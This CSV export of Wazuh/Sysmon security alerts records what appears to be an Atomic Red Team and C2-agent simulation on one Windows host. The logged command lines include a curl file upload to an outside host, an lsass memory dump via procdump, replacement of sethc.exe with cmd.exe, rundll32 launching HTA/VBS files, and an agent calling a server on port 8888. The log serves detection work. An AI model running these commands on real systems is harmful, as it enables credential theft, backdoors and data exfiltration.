wazuh-alerts-4.x-2024.11.30,cPr1e5MBRlc-D5DFjh5R,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1105,technique_name=Ingress Tool Transfer
UtcTime: 2024-11-30 07:25:07.056
ProcessGuid: {15959494-BDD3-674A-5C06-000000000D00}
ProcessId: 4716
Image: C:\Windows\System32\curl.exe
FileVersion: 7.55.1
Description: The curl executable
Product: The curl executable
Company: curl, https://curl.haxx.se/
OriginalFileName: curl.exe
CommandLine: C:\Windows\System32\Curl.exe  -T c:\temp\atomictestfile.txt www.example.com 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=384CCB2CF4B457DA554EE9100BE26FC332155C56,MD5=BDEBD2FC4927DA00EEA263AF9CF8F7ED,SHA256=04AA05D63E3639F90995AFC0E635DAD45E57AFC858A88AC10EDE7C984043C781,IMPHASH=3D26825CC13D552363781DDA178B1ECB
ParentProcessGuid: {15959494-BDD3-674A-5B06-000000000D00}
ParentProcessId: 4468
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com && C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com && C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com && C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:25:07.056949700Z,55210,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,21,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:25:08.144",EventChannel,1732951508.1355143,"Nov 30, 2024 @ 07:25:08.144", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,4716, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,curl.exe,C:\\Windows\\System32\\curl.exe,The curl executable, , ,The curl executable, , ,{15959494-BDD3-674A-5C06-000000000D00},2024-11-30 07:25:07.056,"SHA1=384CCB2CF4B457DA554EE9100BE26FC332155C56,MD5=BDEBD2FC4927DA00EEA263AF9CF8F7ED,SHA256=04AA05D63E3639F90995AFC0E635DAD45E57AFC858A88AC10EDE7C984043C781,IMPHASH=3D26825CC13D552363781DDA178B1ECB","technique_id=T1105,technique_name=Ingress Tool Transfer","curl, https://curl.haxx.se/",7.55.1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-BDD3-674A-5B06-000000000D00},cmd.exe /C C:\\Windows\\System32\\Curl.exe -T c:\\temp\\atomictestfile.txt www.example.com &amp;&amp; C:\\Windows\\System32\\Curl.exe --upload-file c:\\temp\\atomictestfile.txt www.example.com &amp;&amp; C:\\Windows\\System32\\Curl.exe -d c:\\temp\\atomictestfile.txt www.example.com &amp;&amp; C:\\Windows\\System32\\Curl.exe --data c:\\temp\\atomictestfile.txt www.example.com,0x107a6b,4468,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\Curl.exe  -T c:\\temp\\atomictestfile.txt www.example.com,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,dPr3e5MBRlc-D5DFxB66,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 07:27:30.139
ProcessGuid: {15959494-BE62-674A-6106-000000000D00}
ProcessId: 2580
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  localgroup 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=A22C23BE5AF113757D68691B10854375F0CE0EFB,MD5=15534275EDAABC58159DD0F8607A71E5,SHA256=E9739D544EE0D428696036CBD656C41DCC505B67CC43DBA7C6BEC4E3959282AC,IMPHASH=EB2C2924EA23E1A5FB0E3F53F46CB709
ParentProcessGuid: {15959494-BE62-674A-6006-000000000D00}
ParentProcessId: 6856
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C net localgroup && net localgroup ""Administrators""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:27:30.140654200Z,55235,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,3,A C:\\Windows\\System32\\net.exe binary was started by a Windows cmd shell,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92036, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:27:31.224",EventChannel,1732951651.1378138,"Nov 30, 2024 @ 07:27:31.224", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,2580, , , , , , , , , , ,"[""Windows Command Shell"",""DLL Search Order Hijacking""]","[""T1059.003"",""T1574.001""]","[""Execution"",""Persistence"",""Privilege Escalation"",""Defense Evasion""]", , , ,net.exe,C:\\Windows\\System32\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-BE62-674A-6106-000000000D00},2024-11-30 07:27:30.139,"SHA1=A22C23BE5AF113757D68691B10854375F0CE0EFB,MD5=15534275EDAABC58159DD0F8607A71E5,SHA256=E9739D544EE0D428696036CBD656C41DCC505B67CC43DBA7C6BEC4E3959282AC,IMPHASH=EB2C2924EA23E1A5FB0E3F53F46CB709","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-BE62-674A-6006-000000000D00},"cmd.exe /C net localgroup &amp;&amp; net localgroup \""Administrators\""",0x107a6b,6856,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,net  localgroup,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,dfr3e5MBRlc-D5DFxB66,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 07:27:30.189
ProcessGuid: {15959494-BE62-674A-6306-000000000D00}
ProcessId: 7456
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  localgroup ""Administrators""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=A22C23BE5AF113757D68691B10854375F0CE0EFB,MD5=15534275EDAABC58159DD0F8607A71E5,SHA256=E9739D544EE0D428696036CBD656C41DCC505B67CC43DBA7C6BEC4E3959282AC,IMPHASH=EB2C2924EA23E1A5FB0E3F53F46CB709
ParentProcessGuid: {15959494-BE62-674A-6006-000000000D00}
ParentProcessId: 6856
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C net localgroup && net localgroup ""Administrators""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:27:30.190690500Z,55237,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,2,false,3,A C:\\Windows\\System32\\net.exe binary was started by a Windows cmd shell,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92036, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:27:31.255",EventChannel,1732951651.1384079,"Nov 30, 2024 @ 07:27:31.255", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,7456, , , , , , , , , , ,"[""Windows Command Shell"",""DLL Search Order Hijacking""]","[""T1059.003"",""T1574.001""]","[""Execution"",""Persistence"",""Privilege Escalation"",""Defense Evasion""]", , , ,net.exe,C:\\Windows\\System32\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-BE62-674A-6306-000000000D00},2024-11-30 07:27:30.189,"SHA1=A22C23BE5AF113757D68691B10854375F0CE0EFB,MD5=15534275EDAABC58159DD0F8607A71E5,SHA256=E9739D544EE0D428696036CBD656C41DCC505B67CC43DBA7C6BEC4E3959282AC,IMPHASH=EB2C2924EA23E1A5FB0E3F53F46CB709","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-BE62-674A-6006-000000000D00},"cmd.exe /C net localgroup &amp;&amp; net localgroup \""Administrators\""",0x107a6b,6856,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,"net  localgroup \""Administrators\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,d_r3e5MBRlc-D5DFxB66,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 07:27:30.196
ProcessGuid: {15959494-BE62-674A-6406-000000000D00}
ProcessId: 1788
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1  localgroup ""Administrators""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=DC6E267A6BF85702F2DD52CB55F0967E2DB7E80D,MD5=AF569DE92AB6C1B9C681AF1E799F9983,SHA256=FFC30745BE3B6C2771FC4B2993CFF50B5226B271C412467E97B1DC1086DEA888,IMPHASH=5322AC1A3CFF9C8A2AE16A789E26231E
ParentProcessGuid: {15959494-BE62-674A-6306-000000000D00}
ParentProcessId: 7456
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: net  localgroup ""Administrators""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:27:30.196962800Z,55238,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,2,false,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:27:31.287",EventChannel,1732951651.1395893,"Nov 30, 2024 @ 07:27:31.287", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,1788, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net1.exe,C:\\Windows\\System32\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-BE62-674A-6406-000000000D00},2024-11-30 07:27:30.196,"SHA1=DC6E267A6BF85702F2DD52CB55F0967E2DB7E80D,MD5=AF569DE92AB6C1B9C681AF1E799F9983,SHA256=FFC30745BE3B6C2771FC4B2993CFF50B5226B271C412467E97B1DC1086DEA888,IMPHASH=5322AC1A3CFF9C8A2AE16A789E26231E","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-BE62-674A-6306-000000000D00},"net  localgroup \""Administrators\""",0x107a6b,7456,C:\\Windows\\system32\\,C:\\Windows\\System32\\net.exe,"C:\\Windows\\system32\\net1  localgroup \""Administrators\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,g_r6e5MBRlc-D5DFXB7N,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1218.011,technique_name=rundll32.exe
UtcTime: 2024-11-30 07:30:21.793
ProcessGuid: {15959494-BF0D-674A-6B06-000000000D00}
ProcessId: 5968
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: rundll32.exe  url.dll,OpenURL ""PathToAtomicsFolder\T1218.011\src\index.hta"" 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=2F34CCFDD8141AEEE2E89FFB070CE239C7D00706,MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A
ParentProcessGuid: {15959494-BF0D-674A-6A06-000000000D00}
ParentProcessId: 5164
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C rundll32.exe url.dll,OpenURL ""PathToAtomicsFolder\T1218.011\src\index.hta"" && rundll32.exe URL.dll,FileProtocolHandler ""PathToAtomicsFolder\T1218.011\src\akteullen.vbs""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:30:21.795359400Z,55286,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:30:22.919",EventChannel,1732951822.1428423,"Nov 30, 2024 @ 07:30:22.919", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,5968, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,RUNDLL32.EXE,C:\\Windows\\System32\\rundll32.exe,Microsoft® Windows® Operating System, , ,Windows host process (Rundll32), , ,{15959494-BF0D-674A-6B06-000000000D00},2024-11-30 07:30:21.793,"SHA1=2F34CCFDD8141AEEE2E89FFB070CE239C7D00706,MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A","technique_id=T1218.011,technique_name=rundll32.exe",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-BF0D-674A-6A06-000000000D00},"cmd.exe /C rundll32.exe url.dll,OpenURL \""PathToAtomicsFolder\\T1218.011\\src\\index.hta\"" &amp;&amp; rundll32.exe URL.dll,FileProtocolHandler \""PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs\""",0x107a6b,5164,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,"rundll32.exe  url.dll,OpenURL \""PathToAtomicsFolder\\T1218.011\\src\\index.hta\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,hPr6e5MBRlc-D5DFXB7N,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1218.011,technique_name=rundll32.exe
UtcTime: 2024-11-30 07:30:21.912
ProcessGuid: {15959494-BF0D-674A-6C06-000000000D00}
ProcessId: 2476
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: rundll32.exe  URL.dll,FileProtocolHandler ""PathToAtomicsFolder\T1218.011\src\akteullen.vbs""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=2F34CCFDD8141AEEE2E89FFB070CE239C7D00706,MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A
ParentProcessGuid: {15959494-BF0D-674A-6A06-000000000D00}
ParentProcessId: 5164
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C rundll32.exe url.dll,OpenURL ""PathToAtomicsFolder\T1218.011\src\index.hta"" && rundll32.exe URL.dll,FileProtocolHandler ""PathToAtomicsFolder\T1218.011\src\akteullen.vbs""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:30:21.914380800Z,55289,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,2,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:30:22.951",EventChannel,1732951822.1435201,"Nov 30, 2024 @ 07:30:22.951", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,2476, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,RUNDLL32.EXE,C:\\Windows\\System32\\rundll32.exe,Microsoft® Windows® Operating System, , ,Windows host process (Rundll32), , ,{15959494-BF0D-674A-6C06-000000000D00},2024-11-30 07:30:21.912,"SHA1=2F34CCFDD8141AEEE2E89FFB070CE239C7D00706,MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A","technique_id=T1218.011,technique_name=rundll32.exe",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-BF0D-674A-6A06-000000000D00},"cmd.exe /C rundll32.exe url.dll,OpenURL \""PathToAtomicsFolder\\T1218.011\\src\\index.hta\"" &amp;&amp; rundll32.exe URL.dll,FileProtocolHandler \""PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs\""",0x107a6b,5164,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,"rundll32.exe  URL.dll,FileProtocolHandler \""PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,ZPrwe5MBRlc-D5DF8h6B,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1222.001,technique_name=File Permissions Modification
UtcTime: 2024-11-30 07:20:05.527
ProcessGuid: {15959494-BCA5-674A-5306-000000000D00}
ProcessId: 6296
Image: C:\Windows\System32\icacls.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: -
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: iCACLS.EXE
CommandLine: icacls  C:\Windows\System32\sethc.exe /grant Administrators:F /t 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=DDE3DE094698A0830044499EC7E0326462ED1BD3,MD5=2F768115A6D01814354518DE29EE7CFE,SHA256=1846F6D397391B7CF59DB370472895F53D65A5D0EF05F2A2C2DA4F940DDE8290,IMPHASH=446163A548337B5BCF2727BCD1CFB399
ParentProcessGuid: {15959494-BCA5-674A-5106-000000000D00}
ParentProcessId: 5012
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd ) && takeown /F C:\Windows\System32\sethc.exe /A && icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t && copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:20:05.527499200Z,55143,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,20,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:20:06.638",EventChannel,1732951206.1295692,"Nov 30, 2024 @ 07:20:06.638", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,6296, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,iCACLS.EXE,C:\\Windows\\System32\\icacls.exe,Microsoft® Windows® Operating System, , , , , ,{15959494-BCA5-674A-5306-000000000D00},2024-11-30 07:20:05.527,"SHA1=DDE3DE094698A0830044499EC7E0326462ED1BD3,MD5=2F768115A6D01814354518DE29EE7CFE,SHA256=1846F6D397391B7CF59DB370472895F53D65A5D0EF05F2A2C2DA4F940DDE8290,IMPHASH=446163A548337B5BCF2727BCD1CFB399","technique_id=T1222.001,technique_name=File Permissions Modification",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-BCA5-674A-5106-000000000D00},cmd.exe /C IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd ) &amp;&amp; takeown /F C:\\Windows\\System32\\sethc.exe /A &amp;&amp; icacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t &amp;&amp; copy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe,0x107a6b,5012,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,icacls  C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,cvr3e5MBRlc-D5DFOx7-,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 07:26:51.113
ProcessGuid: {15959494-BE3B-674A-5F06-000000000D00}
ProcessId: 4936
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C ""PathToAtomicsFolder\..\ExternalPayloads\procdump.exe"" -accepteula -mm lsass.exe C:\Windows\Temp\lsass_dump.dmp
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:26:51.114831200Z,55229,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,25,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:26:52.190",EventChannel,1732951612.1365406,"Nov 30, 2024 @ 07:26:52.190", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,4936, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-BE3B-674A-5F06-000000000D00},2024-11-30 07:26:51.113,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C \""PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\"" -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,fPr5e5MBRlc-D5DFhR7y,1,1,192.168.117.134,window-agent3,003,Maryam, ,7, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2024-11-30 07:29:27.154
ProcessGuid: {15959494-D38A-6749-4100-000000000D00}
ProcessId: 3356
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
ImageLoaded: C:\Windows\System32\taskschd.dll
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=47221E645D323256A4B0B12B09891E30789EFECC,MD5=46EBDA1D65D32F2D329B8051D039F801,SHA256=52E960EDCCAEF5BB2BCD16627F3FB51BF43D1E97B4BD29D86A72172D0BF1022E,IMPHASH=88AA0B6E4721D06B33225AE5D36F7D6F
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
